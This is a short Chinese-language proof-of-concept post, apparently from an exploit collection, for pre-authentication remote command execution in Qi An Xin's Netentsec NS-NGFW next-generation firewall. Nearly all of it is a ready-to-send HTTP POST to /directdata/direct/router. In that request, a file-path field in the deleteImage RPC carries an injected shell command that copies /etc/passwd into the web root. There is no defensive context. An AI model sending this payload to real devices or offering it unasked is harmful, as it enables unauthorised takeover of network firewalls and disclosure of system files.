# 奇安信NS-NGFW 网康下一代防火墙 前台RCE

情报见：https://forum.ywhack.com/thread-115437-1-1.html

poc：

```
POST /directdata/direct/router HTTP/1.1
Host: 
Connection: close
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=jdlgkktr6uf0uar3u60b3ouig2; ys-active_page=s%3A
Content-Length: 204

{
   "action": "SSLVPN_Resource",
   "method": "deleteImage",
   "data": [{
       "data": ["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test.txt"]
   }],
   "type": "rpc",
   "tid": 17
}
```

https://forum.ywhack.com/thread-115443-1-6.html